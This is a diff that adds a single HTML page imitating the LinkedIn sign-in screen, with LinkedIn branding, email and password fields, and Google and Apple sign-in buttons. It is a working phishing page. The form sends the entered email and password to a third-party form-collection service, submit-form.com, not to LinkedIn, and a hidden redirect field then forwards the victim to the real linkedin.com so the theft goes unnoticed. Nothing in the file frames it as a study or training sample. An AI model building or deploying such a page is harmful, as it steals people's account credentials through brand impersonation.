@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LinkedIn Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --linkedin-blue: #0A66C2;
+      --linkedin-blue-dark: #004182;
+      --linkedin-gray: #666;
+      --transition-speed: 0.2s;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", "Fira Sans", Ubuntu, Oxygen, "Oxygen Sans", Cantarell, "Droid Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Lucida Grande", Helvetica, Arial, sans-serif;
+      background-color: #f3f2ef;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      color: rgba(0, 0, 0, 0.9);
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 24px;
+      background-color: #fff;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      text-align: center;
+      border-radius: 8px;
+    }
+
+    .header-logo {
+      margin-bottom: 24px;
+    }
+
+    .linkedin-text-logo {
+      font-size: 28px;
+      font-weight: 700;
+      color: var(--linkedin-blue);
+      margin-bottom: 24px;
+    }
+
+    h2 {
+      font-size: 32px;
+      font-weight: 600;
+      line-height: 1.25;
+      margin-bottom: 8px;
+      color: rgba(0, 0, 0, 0.9);
+    }
+
+    .subtitle {
+      font-size: 14px;
+      line-height: 1.42857;
+      font-weight: 400;
+      color: rgba(0, 0, 0, 0.9);
+      margin-bottom: 24px;
+    }
+
+    .form-group {
+      position: relative;
+      margin-bottom: 12px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 14px;
+      border: 1px solid rgba(0, 0, 0, 0.6);
+      border-radius: 4px;
+      font-size: 16px;
+      line-height: 1.33333;
+      transition: border-color var(--transition-speed);
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: var(--linkedin-blue);
+      box-shadow: 0 0 0 1px var(--linkedin-blue);
+    }
+
+    .form-group input:focus + label,
+    .form-group input:not(:placeholder-shown) + label {
+      transform: translateY(-20px) scale(0.8);
+      color: var(--linkedin-gray);
+      background: white;
+      padding: 0 4px;
+    }
+
+    .form-group label {
+      position: absolute;
+      left: 12px;
+      top: 14px;
+      font-size: 14px;
+      color: var(--linkedin-gray);
+      pointer-events: none;
+      transition: all var(--transition-speed);
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px 24px;
+      background-color: var(--linkedin-blue);
+      color: white;
+      border: none;
+      border-radius: 24px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 1.33333;
+      transition: background-color var(--transition-speed);
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn:hover {
+      background-color: var(--linkedin-blue-dark);
+    }
+
+    .btn.btn-outline {
+      background-color: transparent;
+      border: 1px solid rgba(0, 0, 0, 0.6);
+      color: rgba(0, 0, 0, 0.6);
+    }
+
+    .btn.btn-outline:hover {
+      background-color: rgba(0, 0, 0, 0.04);
+      border-color: rgba(0, 0, 0, 0.9);
+      color: rgba(0, 0, 0, 0.9);
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 16px 0;
+      color: rgba(0, 0, 0, 0.6);
+      font-size: 14px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.15);
+    }
+
+    .divider:not(:empty)::before {
+      margin-right: 16px;
+    }
+
+    .divider:not(:empty)::after {
+      margin-left: 16px;
+    }
+
+    .forgot-password {
+      color: var(--linkedin-blue);
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 16px;
+      display: inline-block;
+      margin-bottom: 24px;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .small-text {
+      font-size: 12px;
+      line-height: 1.33333;
+      color: rgba(0, 0, 0, 0.6);
+      margin-top: 16px;
+    }
+
+    .link {
+      color: var(--linkedin-blue);
+      text-decoration: none;
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header-logo">
+    <h1 class="linkedin-text-logo">LinkedIn</h1>
+  </div>
+
+  <h2 class="signin-header">Sign in</h2>
+  <p class="subtitle">Stay updated on your professional world</p>
+
+  <form id="login-form" action="https://submit-form.com/nqZAaIQ8n" method="POST">
+    <!-- Hidden field to specify redirect URL upon successful form submission -->
+    <input type="hidden" name="_redirect" value="https://www.linkedin.com" />
+
+    <div class="form-group">
+      <input type="text" id="email" name="email" placeholder=" " required>
+      <label for="email">Email or phone</label>
+    </div>
+
+    <div class="form-group">
+      <input type="password" id="password" name="password" placeholder=" " required>
+      <label for="password">Password</label>
+    </div>
+
+    <a href="#" class="forgot-password">Forgot password?</a>
+
+    <button class="btn" type="submit" id="signin-button">
+      Sign in
+    </button>
+  </form>
+
+  <div class="divider">or</div>
+
+  <button class="btn btn-outline" type="button">
+    <i class="fab fa-google" aria-hidden="true"></i>
+    Sign in with Google
+  </button>
+
+  <button class="btn btn-outline" type="button">
+    <i class="fab fa-apple" aria-hidden="true"></i>
+    Sign in with Apple
+  </button>
+
+  <p class="small-text">
+    By clicking Continue, you agree to LinkedIn's 
+    <a href="#" class="link">User Agreement</a>, 
+    <a href="#" class="link">Privacy Policy</a>, and 
+    <a href="#" class="link">Cookie Policy</a>.
+  </p>
+</div>
+
+</body>
+</html>
